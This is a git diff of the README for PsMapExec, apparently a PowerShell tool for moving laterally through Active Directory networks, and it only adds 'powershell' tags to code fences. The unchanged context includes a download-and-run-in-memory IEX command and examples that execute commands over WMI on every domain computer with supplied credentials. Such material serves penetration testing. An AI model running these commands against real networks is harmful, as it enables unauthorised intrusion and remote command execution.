@@ -42,11 +42,11 @@ Planned methods
   
 ## Usage
 ### Load the script directly into memory
-```
+```powershell
 IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
 ```
 ### Quick examples
-```
+```powershell
 # Execute WMI commands over all systems in the domain using password authentication
  PsMapExec -Targets all -Method WMI -Username Admin -Password Pass -Command ""net user""
 
@@ -88,7 +88,7 @@ PsMapExec -Targets 192.168.1.0/24 IPMI
 Target acquisition through PsMapExec is utilized through ADSI Searcher. As long as you are operating from a domain joined system as a domain user account, no issues should be encountered when acquiring targets.
 By default only enabled Active Directory computer accounts are populated into the target list. PsMapExec will set the Domain to the current user domain unless -Domain is specified.
 IP Address specification is unsupported but in development.
-```
+```powershell
 # All workstations, servers and domain controllers within the domain
 PsMapExec -Targets All
 
@@ -121,7 +121,7 @@ PsMapExec -Targets 192.168.56.0/24
 ```
 ### Authentication Types
 When  -Command and -Module are omitted, PsMapExec will simply check the provided or current user credentials against the specified target systems for administrative access over the specified method.
-```
+```powershell
 # Current user
 PsMapExec -Targets All -Method [Method]
 
@@ -139,13 +139,13 @@ PsMapExec -Targets All -Method WMI -LocalAuth
 ```
 ### Command Execution
 All currently supported command execution methods support the -Command  parameter. The command parameter can be appended to the above Authentication Types to execute given commands as a specified or  the current user.
-```
+```powershell
 PsMapExec -Targets All -Method [Method] -Command [Command]
 ```
 
 ### Module Execution
 All currently supported command execution methods support the -Module  parameter. The module parameter can be appended to the Authentication Types to execute given modules as a specified or the current user. 
-```
+```powershell
 PsMapExec -Targets All -Method [Method] -Module [Module]
 ```
 A list of modules is linked below in the Detailed Usage section.
@@ -177,7 +177,7 @@ If you are working within an environment that has no external access or GitHub i
 
 PsMapExec does not currently host a HTTP server for these so you will need to use something like HFS: https://www.rejetto.com/hfs/?f=dl
 PsMapExec supports pointing to a locally or alternatively hosted server for the script dependencies.
-```
+```powershell
 PsMapExec -Targets All -Username [User] -Password [Pass] -LocalFileServer [IP]
 ```
 
